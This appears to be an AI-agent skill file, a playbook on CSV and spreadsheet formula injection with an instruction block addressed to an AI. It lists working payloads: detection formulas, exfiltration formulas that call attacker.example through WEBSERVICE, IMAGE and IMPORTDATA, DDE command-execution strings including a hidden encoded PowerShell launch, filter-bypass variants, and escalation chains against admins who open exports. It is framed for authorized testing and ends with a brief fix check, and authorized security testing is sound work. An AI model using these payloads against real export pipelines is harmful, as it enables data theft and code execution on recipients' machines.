---
name: csv-formula-injection
description: >-
  CSV and spreadsheet formula injection playbook. Use when an application
  exports user-controlled data to CSV, TSV, XLSX, or other spreadsheet formats
  that downstream users open in Excel, LibreOffice, or Google Sheets.
---

# SKILL: CSV / Formula Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Spreadsheet formula injection (CSV injection) occurs when attacker-controlled input is placed, unescaped, into an exported CSV/TSV/XLSX cell that a spreadsheet application later evaluates. Covers payload families (=, +, -, @, tab/carriage-return chaining), DDE command execution, Excel/Sheets/LibreOffice dialect differences, injection sinks beyond export (mail-merge, BI dashboards, JSON-to-CSV), and verifiable proof-of-concept patterns. Use only against authorized targets.

---

## 0. RELATED ROUTING

Use this skill when a sink renders data into a spreadsheet cell. Also load:

- [injection checking](../injection-checking/SKILL.md) — parent injection router
- [business logic vulnerabilities](../business-logic-vulnerabilities/SKILL.md) — when export filters, report builders, or scheduled jobs are the abuse target
- [cmdi command injection](../cmdi-command-injection/SKILL.md) — DDE payloads effectively reach command execution; chain here for post-exploitation
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) — when the "spreadsheet" is actually an HTML table rendered inline, the sink is the browser, not a spreadsheet engine

---

## 1. ROOT CAUSE & THE CELL EVALUATION RULE

Spreadsheet applications treat a cell as a **formula** when its first character is one of the formula triggers. Applications do **not** distinguish "user data exported from a web app" from "a formula the author typed". Any export path that places raw user input into a cell is therefore a sink.

| Trigger char | Engine behavior | Typical impact |
|---|---|---|
| `=` | Formula evaluation (all engines) | Data exfil, calculation, DDE |
| `+` `-` | Treated as arithmetic formula start (Excel) | Formula eval, DDE |
| `@` | Implicit intersection / legacy macro trigger (Excel) | Formula eval, DDE |
| `\t` (TAB) | Carries formula across "columns" in some TSV parsers | Breaks out of cell boundary |
| `\r` `\n` | Row break in CSV; can inject a new row starting with `=` | New-cell injection |
| `|` | DDE pipe delimiter in some locales | DDE command |

**The core test**: set a profile/name/comment/invoice field to a formula string, then trigger any export (CSV download, report, email attachment, BI extract) and open it in a spreadsheet engine. If the formula evaluates, the sink is vulnerable.

---

## 2. COMMON SINKS (WHERE USER DATA BECOMES A CELL)

Export is the classic sink, but the attack surface is broader. Enumerate every path where user-controlled strings are written into a row/column structure:

```
Classic export:
  GET  /api/users/export?format=csv         ← user name/email fields
  GET  /reports/invoices.csv                ← invoice notes, line-item descriptions
  GET  /admin/audit-log.tsv                 ← log message, user-agent strings
  POST /dashboard/export                    ← custom report builder fields

Non-obvious sinks:
  - Mail-merge templates fed by user data (name/address pulled into a sheet)
  - BI dashboards (Metabase, Superset, Tableau) exporting query results that include user text columns
  - JSON-to-CSV / "download as spreadsheet" buttons anywhere in the app
  - Scheduled reports emailed as .xlsx attachments (cron + user data)
  - CSV import/export round-trips (admin imports CSV; app re-exports it)
  - Error/log viewers with an "export" action
  - Comment threads / ticket systems with CSV export of tickets
  - Form-builder tools that export submissions
```

**Recon tip**: crawl the application for any link/button containing `export`, `download`, `csv`, `xls`, `report`, `extract`. Each is a candidate sink.

---

## 3. PAYLOAD FAMILIES

### 3.1 Harmless detection payloads (proof of evaluation)

These confirm the cell is evaluated without causing harm. Use them first to prove the sink, then escalate.

```
=1+1                         → cell shows 2 if evaluated, literal text if safe
=2*5                         → shows 10
+1+1                         → Excel arithmetic trigger
-2+2                         → Excel arithmetic trigger
@SUM(1,1)                    → shows 2 (implicit intersection)
```

If the exported cell renders `2` instead of `=1+1`, evaluation is confirmed.

### 3.2 Data exfiltration via out-of-band functions

Once evaluation is proven, use functions that make outbound requests. The recipient's spreadsheet engine performs the request when they open the file — a strong indicator that the user (often an admin viewing an export) is the trigger.

**Excel (WEBSERVICE):**
```
=WEBSERVICE("https://attacker.example/?leak="&A1)
=WEBSERVICE("http://attacker.example/"&ENCODEURL(B2&C3))
```

**Excel (HYPERLINK — user must click, but auto-updates link text):**
```
=HYPERLINK("https://attacker.example/?d="&A1,"Click to view details")
```

**Google Sheets (IMPORTDATA / IMPORTXML / IMAGE):**
```
=IMPORTDATA("https://attacker.example/exfil?="&A1)
=IMPORTXML("https://attacker.example/calc","//a")
=IMAGE("https://attacker.example/pixel?leak="&A1)      ← silent image load
```

**LibreOffice (DDE on Windows; WEBSERVICE on newer builds):**
```
=WEBSERVICE("https://attacker.example/"&A1)
```

### 3.3 DDE — command execution (Excel on Windows)

Dynamic Data Exchange lets a formula execute an OS command. Excel shows a security prompt on modern versions, but the command still runs once accepted (and many users accept defaults).

```
DDE classic (cmd):
=cmd|'/c calc.exe'!A1
=cmd|'/c powershell -w hidden -enc <b64>'!A0

Excel 2007+ MSQUERY form:
=cmd|' /c notepad'!A1

Via arithmetic trigger (bypasses some filters that only block leading '='):
+cmd|'/c calc.exe'!A1
@cmd|'/c calc.exe'!A1
-1+cmd|'/c calc.exe'!A1
```

**Note**: DDE must be enabled; modern Excel disables it by default but `WEBSERVICE`/`HYPERLINK` still work. Always prove evaluation first (§3.1), then attempt DDE.

### 3.4 Row/column breakout (CSV structure injection)

CSV uses commas, quotes, and newlines as structure. Injecting these lets an attacker escape the intended cell and start a fresh row beginning with `=`.

```
Field value submitted:   innocent",=1+1
CSV produced (naive):    "innocent",=1+1
                          ↑ closes the quoted cell, then a new cell =1+1 evaluates

Newline breakout (inject a new row):
Field value:   benign\r\n=1+1
CSV produced:  benign
               =1+1          ← new row, first cell is a formula
```

This defeats naive sanitization that only checks the first character of the *submitted* string, because after a newline the formula sits at the start of a *cell* in the file.

---

## 4. SANITIZATION BYPASSES

Defenders often "fix" CSV injection with weak filters. Test each bypass:

| Defense | Bypass |
|---|---|
| Strips leading `=` only | Use `+`, `-`, `@` triggers; or prepend a space then `=` (some parsers trim) |
| Blocks `=cmd` substring | Use `=c`&`md` concatenation, or uppercase `=CMD`, or tab between `c` and `md` |
| Prefixes cell with `'` (Excel escape) | Newline breakout creates a *new* unescaped cell starting with `=` |
| Allow-lists digits/letters | Cannot represent `=` — but check if `&#61;` or unicode full-width `＝` (U+FF1D) is normalized to `=` by the engine |
| Strips `\r\n` | Test `\r` alone, `\n` alone, or `\x0b`/`\x0c` vertical tab as row separators in lenient parsers |
| HTML-encodes for inline table (not real CSV) | The sink is the browser → switch to XSS payloads (route to xss skill) |

**Encoding edge cases**: some export pipelines round-trip through JSON (`"=1+1"`) then re-serialize to CSV. If a JSON string contains `=1+1` and is written verbatim, the sink fires. Test the full round-trip, not just the input form.

---

## 5. ENGINE DIALECT MATRIX

Different spreadsheet engines evaluate different functions. Tailor the payload to the likely consumer (admin finance team → Excel/Windows; data team → Sheets; ops → LibreOffice).

| Capability | Excel (Win) | Excel (Mac) | Google Sheets | LibreOffice |
|---|---|---|---|---|
| `=1+1` detection | Yes | Yes | Yes | Yes |
| `WEBSERVICE` OOB | Yes | No | No | Newer builds |
| `HYPERLINK` (click) | Yes | Yes | Yes | Yes |
| `IMPORTDATA/IMAGE` OOB | No | No | Yes | No |
| DDE `cmd|` exec | Yes (prompt) | No | No | Win only |
| `@` trigger | Yes | Partial | No | Partial |
| `+`/`-` trigger | Yes | Partial | No | Partial |

When the consumer is unknown, lead with `=1+1` (universal) then try `WEBSERVICE` + `IMAGE` + `IMPORTDATA` to cover Excel and Sheets.

---

## 6. PROOF-OF-CONCEPT METHODOLOGY

A reproducible PoC that a vendor/triage team can verify:

```
1. Create an account. Set the "Full Name" or "Notes" field to:  =1+1
2. Trigger the export: GET /api/users/export?format=csv
3. Open the downloaded file in Excel/Sheets.
4. Observe the cell renders 2 (not the literal "=1+1"). Evaluation confirmed.
5. Replace the field with an OOB payload:
     =IMAGE("https://attacker.example/poc?leak="&A1)      (Sheets)
     =WEBSERVICE("https://attacker.example/poc?leak="&A1) (Excel)
6. Re-export, open the file. Confirm the HTTP request hits attacker.example.
7. Capture the request log as evidence. This proves user data is interpreted
   as a formula and can force an outbound request from the recipient's machine.
```

**Impact framing for reports**: medium-to-high depending on consumer. DDE → code execution on an admin workstation; OOB functions → data exfiltration from the recipient's environment and a pivot signal that the recipient's machine trusts the app's exports.

---

## 7. CHAINING & HIGHER IMPACT

- **Stored → admin escalation**: inject the payload via a low-priv user; an admin exports "all users" and opens it. The formula runs in the admin's context (DDE = admin shell).
- **Mail-merge weaponization**: if the app merges user data into a spreadsheet-backed template that is then emailed, the recipient's spreadsheet evaluates the payload on open.
- **BI dashboard blind exfil**: a Metabase/Superset query result containing a user-text column, exported to CSV, can exfil other rows via `&A1` references when opened.
- **Persisted reports**: scheduled reports re-export periodically; a single stored payload keeps firing on every scheduled export.

---

## 8. TESTING CHECKLIST

```
□ Enumerate every export/download/report endpoint (grep UI + JS for csv/xls/export/report)
□ For each sink, identify which user-controlled fields land in cells
□ Submit =1+1 into each field, export, open in a spreadsheet engine, check for "2"
□ If stripped, try +1+1, -1+1, @SUM(1,1) alternative triggers
□ Confirm OOB: IMAGE (Sheets), WEBSERVICE (Excel), IMPORTDATA (Sheets); watch attacker listener
□ Test newline (\r\n, \r, \n) row-breakout to start a fresh = cell
□ Test quote-breakout:  value",=1+1
□ If a filter blocks =cmd, try concatenation =c&"md", uppercase, tab insertion
□ Test the full input→store→export round-trip (not just the input form)
□ Verify impact: who opens the export (admin/finance), what engine, DDE feasibility
□ Confirm the fix: leading trigger chars are prefixed with a single quote ' or
  replaced, AND newlines/quotes in cell content are properly CSV-escaped
```

---

## 9. NEXT ROUTING

- Back to the injection router: [injection checking](../injection-checking/SKILL.md)
- If the sink is an inline HTML table (browser, not spreadsheet engine): [xss cross site scripting](../xss-cross-site-scripting/SKILL.md)
- If DDE lands a shell and you need post-exploitation commands: [cmdi command injection](../cmdi-command-injection/SKILL.md)
- If the abuse is about export filters/quotas/scheduled-job logic: [business logic vulnerabilities](../business-logic-vulnerabilities/SKILL.md)

---


## 全文导航（已拆分）

主卡保留前 10 节；其余 10 节在 `references/full.md`：

- 10. 2026 EMERGING TECHNIQUES
- PRACTICAL ATTACK CHAINS (2026)
- 外部库增量（2026-10-11 分享包）
- 真源
- 0. QUICK START
- 1. DDE INJECTION (EXCEL / LIBREOFFICE)
- 2. OBFUSCATION
- 3. GOOGLE SHEETS
- 4. TESTING METHODOLOGY
- 5. DEFENSE

加载：`skill_view(name='csv-formula-injection', file_path='references/full.md')`

> 全文较大（44893 字符），已分 3 片：`references/parts/index.md`（每片约 12KB）。整包仍可读 `references/full.md`。
